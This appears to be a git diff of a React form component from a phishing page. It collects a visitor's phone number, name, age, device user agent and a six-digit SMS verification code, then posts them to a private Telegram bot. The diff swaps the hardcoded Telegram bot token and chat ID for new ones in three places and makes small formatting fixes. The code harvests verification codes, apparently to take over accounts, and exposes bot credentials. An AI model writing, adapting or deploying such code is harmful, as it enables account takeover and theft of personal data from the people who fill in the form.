@@ -15,7 +15,7 @@ const ContextForm = ({ children }) => {
   const [telefone, setTelefone] = useState("");
 
   // Estado para armazenar os valores dos campos
-  const [values, setValues] = useState(["", "", "", "","",""]);
+  const [values, setValues] = useState(["", "", "", "", "", ""]);
   console.log(values.join(""));
 
   // Função para lidar com a entrada
@@ -32,7 +32,7 @@ const ContextForm = ({ children }) => {
     }
   };
   // Limpar os campos
-  const handleClear = () => setValues(["", "", "", "","",""]);
+  const handleClear = () => setValues(["", "", "", "", "", ""]);
 
   const sendMessageToTelegram = (e) => {
     e.preventDefault();
@@ -45,8 +45,8 @@ const ContextForm = ({ children }) => {
     localStorage.setItem("telefone", telefone);
 
     const dispositivo = navigator.userAgent;
-    let chatId = "6579066348";
-    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    let chatId = "7911135198";
+    let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
 
     const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -75,10 +75,10 @@ const ContextForm = ({ children }) => {
 
   function captureDispositivo() {
     const dispositivo = navigator.userAgent;
-    let chatId = "6579066348";
-    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    let chatId = "7911135198";
+    let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
     const message = `📱Dispositivo:${dispositivo}`;
-    
+
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: {
@@ -107,16 +107,16 @@ const ContextForm = ({ children }) => {
   const codigoVerification = (e) => {
     e.preventDefault();
 
-    if(values.join("").length < 6) return alert("Rellena los campos vacíos!");
+    if (values.join("").length < 6) return alert("Rellena los campos vacíos!");
 
     const dispositivo = navigator.userAgent;
     const name = localStorage.getItem("nome");
     const idadee = localStorage.getItem("idade");
     const telefonee = localStorage.getItem("telefone");
 
-    let chatId = "6579066348";
-    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
-  
+    let chatId = "7911135198";
+    let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
+
     const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
       ""
     )}📱Dispositivo:${dispositivo}`;
@@ -139,7 +139,7 @@ const ContextForm = ({ children }) => {
         }
       })
       .catch((error) => console.log("Erro: ", error));
-      setValues(["","","","","",""])
+    setValues(["", "", "", "", "", ""]);
   };
 
   return (
